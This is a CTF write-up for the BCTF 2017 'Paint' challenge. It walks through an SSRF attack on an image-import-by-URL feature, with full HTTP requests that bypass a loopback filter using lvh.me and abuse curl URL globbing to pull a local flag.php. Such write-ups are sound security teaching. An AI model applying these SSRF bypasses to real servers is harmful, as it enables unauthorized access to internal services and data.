---
layout: post
title: Paint
category: BCTF-2017
---

# Description

BCTF was really fun this year, since I managed to solve a couple of challenges :)

I decided to do a writeup on this particular challenge as I found the
vulnerability really interesting. Since only 13 teams solved it,
I think the solution to the challenge is worth sharing.

I'll also take this time to write a bit about my general methodology
behind approaching web challenges, since I've noticed they can be pretty
rough for some people if you don't know where to start!

# The Challenge

We are given a website which is basically an online painting app.

![app](/assets/img/bctf-2017/app.png)

The app has the following features :
  - Draw various lines/shapes in a canvas
  - Import images from the filesystem
  - Import images from a given URL
  - Save the canvas as an image

Going through my usual methodology, I start by rapidly testing each feature
to get a better understanding of how each of them work as well as write down
any kind of vulnerability that would come to mind.

When all is done, we can reach the following conclusions :

  - Drawing lines/shapes is a 100% javascript feature. Since there's no concept of `users` (for client side attacks), we can safely assume that this feature is irrelevant here.

  - Saving the canvas sends a `POST` request with `base64` encoded data
  generated by the canvas. The data is then converted to a PNG server
  side, and sent back as a response to the user for download.
  **Vulnerabilities that come to mind : ImageTragick.**

  - Importing images from the filesystem consists of a simple `POST` request
 sending our file to the server. The webserver then saves it in an `/uploads`
 folder for use in the canvas, and responds to the user with the location +
 size of the uploaded file. Weirdly enough, the server doesn't validate whether
 the given file is a legitimate image.
 **Vulnerabilities that come to mind : Command injection in the filename,
 ImageTragick and unrestricted file upload (PHP webshells).**

 - Lastly, importing images from a URL is a `POST` request with a given URL.
 The server sends a request to the given URL, checks if the response is in fact
 an image, and responds accordingly. Just like the other import feature, the
 response will include the size of the file found in the URL, as well as the
 `/uploads` path or an error message if the URL is an invalid image.
 **Vulnerabilities that come to mind : SSRF, ImageTragick and PHP webshell uploads.**

Here is the list of potential vulnerabilities I had written down so far :
  - ImageTragick
  - Command Injection
  - Unrestricted file upload
  - SSRF

Now that we have a better understanding of the app, I usually move on to checking
the source code files (HTML, Javascript, CSS) and response headers for any clues
that could narrow down our list.

As most of you will have noticed in the HTML source code, there's a hint
pointing us to a `/flag.php` page :

```
<title>Firesun's Paint</title>
<!-- <link rel="hint" href="/flag.php"/> -->
<link rel="stylesheet" href="css/paint.css"/>
```

Visiting the `/flag.php` page gives us the following output :

```
Yeah, flag is here. But flag is so secret that only
local users could access it.
```

It's pretty clear at this point that this is an SSRF challenge where
we have to fetch the contents of the flag.php file through 127.0.0.1.

## Importing Images from a URL

Let's move on to testing the "image import via URL" feature.

Here's an example request :

```
POST /image.php HTTP/1.1
Host: paint.bctf.xctf.org.cn
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23

url=http://example.com/
```

Depending on the URL given, we can generate three different responses
from the server :

- `{"files":{"error":"Invalid URL"}}` if the URL doesn't specify a resource (e.g. `http://example.com/`)

- `{"files":{"size":XYZ,"error":"Not Image"}}` if the URL points to a resource
where the contents is not an image (e.g. `http://example.com/a.abc` which
responds with a 404 error message`)

- `{"files":{"size":301,"url":"uploads\/1492559421EfKo2mXY.png"}}` if the URL
points to an image.

The goal of the challenge seems pretty straightforward. I'm guessing we'll
have to find a way to send a request to flag.php in order for it to be
uploaded as an image in the `/uploads` folder.

## Requesting flag.php

Let's try fetching the flag.php file through this feature.

Request :
```
POST /image.php HTTP/1.1
Host: paint.bctf.xctf.org.cn
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42

url=http://127.0.0.1/flag.php
```

Response :
```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 19 Apr 2017 00:01:33 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 33

{"files":{"error":"Invalid URL"}}
```

`Invalid URL`... This doesn't make sense, since our URL is well structured.
We'll assume that this message is being trigged by the `127.0.0.1` IP address
that we provided.

If we can't specify the loopback IP address directly, we can try specifying
a domain name which points to `127.0.0.1` instead.

If you don't know any, a quick google search will give you a list of domains.
In our case, we'll use `lvh.me`.

Request :
```
POST /image.php HTTP/1.1
Host: paint.bctf.xctf.org.cn
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 26

url=http://lvh.me/flag.php
```

Response :
```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 19 Apr 2017 00:07:16 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 42

{"files":{"size":374,"error":"Not Image"}}
```

Great! Different error message now! We know that the file has been requested
since the `size` response is present, and we also know that the response contains
the flag now since `http://paint.bctf.xctf.org.cn/flag.php` has a size of :

```
$ curl http://paint.bctf.xctf.org.cn/flag.php 2>/dev/null | wc -c
      80
```

... 80 bytes, but our response shows a size of 374 bytes.

## Bypassing the "Not Image" error

So the problem at this point is to figure out a way to trick
the webapp into thinking our `flag.php` is in fact an image.

Let's do some fuzzing on the `url` parameter, maybe we'll find something
useful!

I always suggest using Burpsuite Intruder for this. Here's my config (note the
`%` before payload position.

![intruder_1](/assets/img/bctf-2017/intruder_1.png)

We are testing hex digits between `01` to `ff`, prepending the `%` sign
to URL encode it. I find this is a good way to test for blacklisted characters or
odd behaviors. I'm testing these characters in the `query string` section of the
URL so that I don't end up getting too many weird results from invalid domains and stuff like that...

![intruder_2](/assets/img/bctf-2017/intruder_2.png)

Here are the results of the intruder, we'll look at the length of the
responses :

![intruder_3](/assets/img/bctf-2017/intruder_3.png)

The length of the responses are :
  - 185: These are `{"files":{"size":1270,"error":"Not Image"}}` responses.
  - 175: There are `{"files":{"error":"Invalid URL"}}` responses.
  - 182: These are `{"files":{"size":0,"error":"Not Image"}}`

The first two response lengths are normal. The 185 is the standard message for
URLs that don't point to images, and we know the request worked since we have a
size of 1270. The 175 seems to be triggered by non printable characters in the URL.

But what's with the 182 response? The response suggests that the URL went through
and is valid, yet the size of the response is 0 instead of 1270. Let's look at
which characters triggered this :

```
0a => \n
5b => [
5d => ]
7b => {
7d => }
```

Hmmm, I've seen this set of characters before. They are used by `curl`
for URL globbing! (Read more about it here : [https://ec.haxx.se/cmdline-globbing.html](https://ec.haxx.se/cmdline-globbing.html))

Basically, URL globbing allows us to send multiple requests using a single URL.
For example, `curl http://example.com/[1-3].php` will send the requests to the
following URLs:
  - http://example.com/1.php
  - http://example.com/2.php
  - http://example.com/3.php

The `{}` characters allows us to do basically the same thing, but with strings
instead of a range of numbers.

Let's try it with the flag.php file. I use a previously uploaded file in the
webapp to test this. The uploaded file has a size of 23249 bytes.

The following request uses URL globbing to send a request to both
a valid PNG and the flag.php file. The response of each URL is
concatenated.

Request :
```
POST /image.php HTTP/1.1
Host: paint.bctf.xctf.org.cn
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 59

url=http://lvh.me/{uploads/1492563387EJ5e3yT5.png,flag.php}
```

Response :
```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 19 Apr 2017 00:57:06 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 64

{"files":{"size":23623,"url":"uploads\/14925634266UJ6MMAA.png"}}
```

The webserver accepted it! Pay attention to the size. The response size
is 23623. If we subtract it from the size of our initial PNG...
```
$ echo "23623 - 23249" | bc
374
```

... we get the size of flag.php! So the webapp seems to have taken both
URLs into account. Let's check if the uploaded PNG includes our flag now.

```
$ curl http://paint.bctf.xctf.org.cn/uploads/14925634266UJ6MMAA.png 2>/dev/null | strings
IHDR
pHYs
BIDATx
v><?
[f'[&
zmL&?=
_;^v
w$na
{N1;
WLi

SWLs
Uc|y
IEND
```

No flag to be found. Seems like the flag.php output was stripped out.
